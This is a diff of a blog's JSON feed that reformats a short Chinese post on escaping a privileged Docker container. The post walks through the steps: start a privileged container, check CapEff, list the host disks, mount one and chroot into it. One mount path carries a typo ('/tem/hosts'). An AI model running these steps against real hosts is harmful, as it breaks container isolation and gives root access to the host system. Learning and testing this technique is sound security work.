@@ -9,7 +9,7 @@
             "url": "http://example.com/2023/10/27/docker%E9%80%83%E9%80%B8/",
             "title": "docker逃逸",
             "date_published": "2023-10-27T06:33:01.000Z",
-            "content_html": "<p><em>特权模式</em>逃逸</p>\n<p>当容器启动加上–privileged选项时，容器可以访问宿主机上所有设备</p>\n<p>启动一个特权容器<br><code>sudo docker run --rm --privileged -it ubuntu:18.04 bash</code></p>\n<p>判断容器是否特权启动<br><code>查看磁盘，默认情况下容器执行fdisk -l 是无法查看的</code><br><code>fdisk -l</code></p>\n<p>查看capEff值，特权值为0000003fffffffff<br><code>cat /proc/self/status | grep CapEff</code></p>\n<p>#创建一个挂载目录<br><code>mkdir /tmp/hosts</code></p>\n<p>#查看宿主机磁盘文件<br><code>fdisk -l</code></p>\n<p>#挂载到创建的目录<br><code>mount /dev/sda1 /tem/hosts/</code><br><code>cd /tmp/hosts/</code></p>\n<p>#通过chroot切换bash<br><code>chroot ./ bash</code></p>\n",
+            "content_html": "<p><em>特权模式</em>逃逸</p>\n<p>当容器启动加上–privileged 选项时，容器可以访问宿主机上所有设备</p>\n<p>启动一个特权容器<br>\n <code>sudo docker run --rm --privileged -it ubuntu:18.04 bash</code></p>\n<p>判断容器是否特权启动<br>\n <code>查看磁盘，默认情况下容器执行fdisk -l 是无法查看的</code> <br>\n <code>fdisk -l</code></p>\n<p>查看 capEff 值，特权值为 0000003fffffffff<br>\n <code>cat /proc/self/status | grep CapEff</code></p>\n<p>#创建一个挂载目录<br>\n <code>mkdir /tmp/hosts</code></p>\n<p>#查看宿主机磁盘文件<br>\n <code>fdisk -l</code></p>\n<p>#挂载到创建的目录<br>\n <code>mount /dev/sda1 /tem/hosts/</code> <br>\n <code>cd /tmp/hosts/</code></p>\n<p>#通过 chroot 切换 bash<br>\n <code>chroot ./ bash</code></p>\n",
             "tags": []
         }
     ]
